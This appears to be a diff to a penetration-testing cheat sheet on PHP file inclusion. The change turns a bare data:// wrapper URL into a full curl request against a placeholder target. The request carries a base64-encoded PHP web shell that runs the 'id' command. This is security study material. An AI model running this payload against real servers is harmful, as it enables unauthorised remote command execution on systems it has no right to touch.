@@ -539,7 +539,7 @@ if (isset($_GET['c'])) {
 #### Remote Code Execution
 ```
 echo '<?php system($_GET["cmd"]); ?>' | base64
-/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 ```
 
 #### Input
